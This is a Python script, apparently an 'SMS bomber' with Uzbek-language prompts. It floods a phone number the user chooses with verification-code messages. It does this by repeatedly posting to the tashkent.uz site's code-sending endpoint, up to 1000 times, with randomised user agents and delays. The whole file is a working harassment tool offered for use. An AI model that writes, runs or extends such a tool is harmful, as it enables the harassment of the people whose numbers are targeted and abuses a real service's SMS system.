import requests

import time
import random

from utils import random_user_agent
from utils import (FormattingOptions, main_menu)
from utils import (clear_terminal, super_input)

fo = FormattingOptions()
session = requests.session()


class TashkentBomber:
    def __init__(self, session: requests.Session) -> None:
        self.sess = session
        self.main_url = "https://www.tashkent.uz/uz/virtual-send-code?phone={}&isSend=true"
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'User-Agent': random_user_agent(),
        }

    def start_bombing(self, phone: str, amount: int = 1):
        print(fo._(fo.BOLD, "\nBu bomberda ko'proq kutish kerak.\nTo'xtatish uchun: [Ctrl]+[C]"))
        
        for s in range(1, amount + 1):
            r = self.sess.post(
                url=self.main_url.format(phone),
                headers=self.headers
            )
            r = r.text if r.status_code == 200 else 'Error'
            r = 'Error' if r.strip() == '' else r

            f = {'format':fo.OKGREEN, 'text': 'Muvaffaqiyatli!'} \
                if 'Error' not in r and isinstance(r, str) \
                else {'format': fo.FAIL, 'text': 'Muvaffaqiyatsiz!'}
            print(f"{fo._(fo.BOLD, str(s)+'|')} {fo._(f['format'], f['text'])}")

            time.sleep(random.choice([3, 4, 5]))
        else:
            print(fo._(fo.BOLD, '\nTugadi :)\n'))


main_menu()
tbomb = TashkentBomber(session)
while True:
    try:
        phone = super_input(
            text=fo._(fo.OKBLUE, 'Telefon raqamni (+998)siz kiriting (namuna: 991234567)\n> '),
            phone=True, amount=False)
        amount = super_input(
            text=fo._(fo.OKBLUE, 'Nechta SMS borishini istaysiz? (max: 1000)\n> '),
            phone=False, amount=True)
        
        if all([elem is None for elem in [phone, amount]]):
            print(fo._(fo.FAIL, 'Ma\'lumotlar xato kiritildi!')); continue
        
        tbomb.start_bombing(phone, amount)
    except KeyboardInterrupt:
        clear_terminal(); break
    except Exception as e:
        print(fo._(fo.FAIL, f'Qanaqadir noma\'lum, g\'alati xatolik yuz berdi!\n{e}')); break
